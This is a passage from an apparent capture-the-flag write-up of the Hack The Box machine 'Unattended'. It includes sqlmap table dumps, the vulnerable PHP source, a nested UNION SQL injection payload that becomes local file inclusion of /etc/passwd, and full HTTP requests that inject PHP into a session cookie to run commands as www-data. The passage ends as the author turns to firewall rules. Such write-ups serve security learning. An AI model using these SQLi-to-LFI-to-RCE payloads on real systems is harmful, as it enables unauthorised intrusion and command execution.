<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">0</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">11</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">11</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">2</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">25</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">4</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">main</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">35</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">0</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">41</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">41</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">3</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">465</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">5</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">about</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">1</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">0</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">3</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">587</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieving</span> <span class="n">the</span> <span class="k">length</span> <span class="k">of</span> <span class="n">query</span> <span class="k">output</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="mi">7</span>
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="n">contact</span>
<span class="k">Database</span><span class="p">:</span> <span class="n">neddy</span>
<span class="k">Table</span><span class="p">:</span> <span class="n">idname</span>
<span class="p">[</span><span class="mi">6</span> <span class="n">entries</span><span class="p">]</span>
<span class="o">+</span><span class="c1">-----+-------------+----------+</span>
<span class="o">|</span> <span class="n">id</span>  <span class="o">|</span> <span class="n">name</span>        <span class="o">|</span> <span class="n">disabled</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+-------------+----------+</span>
<span class="o">|</span> <span class="mi">1</span>   <span class="o">|</span> <span class="n">main</span><span class="p">.</span><span class="n">php</span>    <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">2</span>   <span class="o">|</span> <span class="n">about</span><span class="p">.</span><span class="n">php</span>   <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">3</span>   <span class="o">|</span> <span class="n">contact</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">25</span>  <span class="o">|</span> <span class="n">main</span>        <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">465</span> <span class="o">|</span> <span class="n">about</span>       <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">587</span> <span class="o">|</span> <span class="n">contact</span>     <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+-------------+----------+</span>

<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="k">table</span> <span class="s1">'neddy.idname'</span> <span class="n">dumped</span> <span class="k">to</span> <span class="n">CSV</span> <span class="n">file</span> <span class="s1">'/root/.sqlmap/output/www.nestedflanders.htb/dump/neddy/idname.csv'</span>               
<span class="p">[</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetched</span> <span class="k">data</span> <span class="n">logged</span> <span class="k">to</span> <span class="nb">text</span> <span class="n">files</span> <span class="k">under</span> <span class="s1">'/root/.sqlmap/output/www.nestedflanders.htb'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ending</span> <span class="o">@</span> <span class="mi">18</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">32</span> <span class="o">/</span><span class="mi">2019</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">23</span><span class="o">/</span>
</code></pre></div></div>

<h2 id="sqli-to-lfi">SQLI to LFI</h2>
<p>Now we have the actual file names, <code class="language-plaintext highlighter-rouge">about</code> for example (<code class="language-plaintext highlighter-rouge">/47c1ba4f7b1edf28ea0e2bb250717093.php </code>) :
<br><img src="/images/hackthebox/unattended/14.png" alt="" class="align-center"><br><br>
It’s just the text and nothing else. We can also verify that there is nothing hidden by checking the <code class="language-plaintext highlighter-rouge">php</code> source of the three pages :</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/47c1ba4f7b1edf28ea0e2bb250717093.php
<span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
<span class="nt">&lt;div&gt;</span>
Hello <span class="cp">&lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : "visitor" ; ?&gt;</span>,
our Company is world wide leading expert about Nesting stuff.<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;div&gt;</span>
We can nest almost everything after or before anything based on your needs.
Feel free to contact us with usual email addresses, our contact form is currently offline because of a recent attack.
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/0f710bba8d16303a415266af8bb52fcb.php
<span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
Hello <span class="cp">&lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : "visitor" ; ?&gt;</span>,

thanks for getting in touch with us!
Unfortunately our server is under *heavy* attack and we disable almost every dynamic page.
Please come back later.<span class="nt">&lt;/br&gt;</span>
<span class="nt">&lt;/body&gt;</span>
root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/787c75233b93aa5e45c3f85d130bfbe7.php
<span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
<span class="nt">&lt;div&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">787c75233b93aa5e45c3f85d130bfbe7.gif</span><span class="nt">&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;div&gt;</span>
Hello <span class="cp">&lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : "visitor" ; ?&gt;</span>,
we are very sorry to show you this ridiculous page but we had to restore our website to 2001-layout.
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;div&gt;</span>
As a partial recover, we offer you a printed portfolio: just drop us an email with a contact request.
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</code></pre></div></div>
<p>First guess will be that the page name gets queried from the database table <code class="language-plaintext highlighter-rouge">idname</code> then the path (or the actual <code class="language-plaintext highlighter-rouge">php</code> file name) gets queried from the database table <code class="language-plaintext highlighter-rouge">filepath</code> then it includes that page to the index page. And that’s true but since we have the source of <code class="language-plaintext highlighter-rouge">index.php</code> let’s also look at it.<br>
By looking at the dumped tables and the source of <code class="language-plaintext highlighter-rouge">index.php</code> again we can understand the following :
<br>The <code class="language-plaintext highlighter-rouge">SQL</code> injectable query we just exploited is part of the function <code class="language-plaintext highlighter-rouge">getTplFromID</code> which returns the page name after querying it from the table <code class="language-plaintext highlighter-rouge">idname</code> based on our given id number : 
<br>Function <code class="language-plaintext highlighter-rouge">getTplFromID()</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">getTplFromID</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">global</span> <span class="nv">$debug</span><span class="p">;</span>
	<span class="nv">$valid_ids</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mi">465</span><span class="p">,</span><span class="mi">587</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'id'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]),</span><span class="nv">$valid_ids</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
			<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '"</span><span class="mf">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '25'"</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sqltpl: </span><span class="nv">$sql</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span> 
	
	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
		<span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nv">$ret</span> <span class="o">=</span> <span class="s1">'main'</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"rettpl: </span><span class="nv">$ret</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
	<span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Table <code class="language-plaintext highlighter-rouge">idname</code> :</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span><span class="c1">-----+-------------+----------+</span>
<span class="o">|</span> <span class="n">id</span>  <span class="o">|</span> <span class="n">name</span>        <span class="o">|</span> <span class="n">disabled</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+-------------+----------+</span>
<span class="o">|</span> <span class="mi">1</span>   <span class="o">|</span> <span class="n">main</span><span class="p">.</span><span class="n">php</span>    <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">2</span>   <span class="o">|</span> <span class="n">about</span><span class="p">.</span><span class="n">php</span>   <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">3</span>   <span class="o">|</span> <span class="n">contact</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span> <span class="mi">1</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">25</span>  <span class="o">|</span> <span class="n">main</span>        <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">465</span> <span class="o">|</span> <span class="n">about</span>       <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
<span class="o">|</span> <span class="mi">587</span> <span class="o">|</span> <span class="n">contact</span>     <span class="o">|</span> <span class="mi">0</span>        <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+-------------+----------+</span>
</code></pre></div></div>
<p>There is another function called <code class="language-plaintext highlighter-rouge">getPathFromTpl</code> which takes the returned page name and queries the actual path from the table <code class="language-plaintext highlighter-rouge">filepath</code> then returns it :
<br>Function <code class="language-plaintext highlighter-rouge">getPathFromTpl()</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">getPathFromTpl</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$tpl</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">global</span> <span class="nv">$debug</span><span class="p">;</span>
	<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT path from filepath where name = '"</span><span class="mf">.</span><span class="nv">$tpl</span><span class="mf">.</span><span class="s2">"'"</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sqlpath: </span><span class="nv">$sql</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
			<span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'path'</span><span class="p">];</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"retpath: </span><span class="nv">$ret</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
	<span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Table <code class="language-plaintext highlighter-rouge">filepath</code> :</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">+</span><span class="c1">---------+--------------------------------------+</span>
<span class="o">|</span> <span class="n">name</span>    <span class="o">|</span> <span class="n">path</span>                                 <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+--------------------------------------+</span>
<span class="o">|</span> <span class="n">about</span>   <span class="o">|</span> <span class="mi">47</span><span class="n">c1ba4f7b1edf28ea0e2bb250717093</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">contact</span> <span class="o">|</span> <span class="mi">0</span><span class="n">f710bba8d16303a415266af8bb52fcb</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">main</span>    <span class="o">|</span> <span class="mi">787</span><span class="n">c75233b93aa5e45c3f85d130bfbe7</span><span class="p">.</span><span class="n">php</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+--------------------------------------+</span>
</code></pre></div></div>
<p>The first function gets called and its return value gets saved in the variable <code class="language-plaintext highlighter-rouge">tpl</code> : <code class="language-plaintext highlighter-rouge">$tpl = getTplFromID($conn);</code>
<br>Then the second function gets called with the variable <code class="language-plaintext highlighter-rouge">tpl</code> and its return value gets saved in the variable <code class="language-plaintext highlighter-rouge">inc</code>
<br>And finally it includes that page <code class="language-plaintext highlighter-rouge">include("$inc");</code>
<br>We have a <code class="language-plaintext highlighter-rouge">SQL</code> injection vulnerability which we can use to control what’s being included, in other words we have a local file inclusion vulnerability.<br>
After some attempts to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code> this payload worked : <code class="language-plaintext highlighter-rouge">' UNION SELECT "main' UNION SELECT '/etc/passwd';-- ";--</code>
<br><img src="/images/hackthebox/unattended/15.png" alt="" class="align-center"><br><br></p>

<h2 id="lfi-to-rce">LFI to RCE</h2>
<p>We need to get <code class="language-plaintext highlighter-rouge">RCE</code> from this <code class="language-plaintext highlighter-rouge">LFI</code>. If I could include my session file (<code class="language-plaintext highlighter-rouge">/var/lib/php/session/sess_[SESSION COOKIE]</code>) then I could put <code class="language-plaintext highlighter-rouge">php</code> code in a cookie and include it. My session cookie was <code class="language-plaintext highlighter-rouge">c5vmccsqkle2rdionj28kit221</code>.<br>
Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221;</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 23 Aug 2019 16:25:24 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">935</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
<span class="na">X-Upstream</span><span class="p">:</span> <span class="s">127.0.0.1:8080</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
----------------
 Removed Output
----------------
<span class="c">&lt;!-- &lt;div align="center"&gt; --&gt;</span>
PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";
<span class="c">&lt;!-- &lt;/div&gt; --&gt;</span>

<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>It worked, I created a cookie and called it <code class="language-plaintext highlighter-rouge">RCE</code>, any <code class="language-plaintext highlighter-rouge">php</code> code I put there will be included and executed so we can get <code class="language-plaintext highlighter-rouge">RCE</code> by <code class="language-plaintext highlighter-rouge">system()</code> or <code class="language-plaintext highlighter-rouge">passthru()</code>, let’s try <code class="language-plaintext highlighter-rouge">whoami</code> :
<br>Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('whoami')?&gt;;</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 23 Aug 2019 16:25:45 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">955</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
<span class="na">X-Upstream</span><span class="p">:</span> <span class="s">127.0.0.1:8080</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
----------------
 Removed Output
----------------
<span class="c">&lt;!-- &lt;div align="center"&gt; --&gt;</span>
PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";RCE|s:26:"www-data
";<span class="c">&lt;!-- &lt;/div&gt; --&gt;</span>

<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>I spent a lot of time trying to get a reverse shell and I couldn’t, so I checked <code class="language-plaintext highlighter-rouge">iptables</code> rules :
<br>Request :</p>
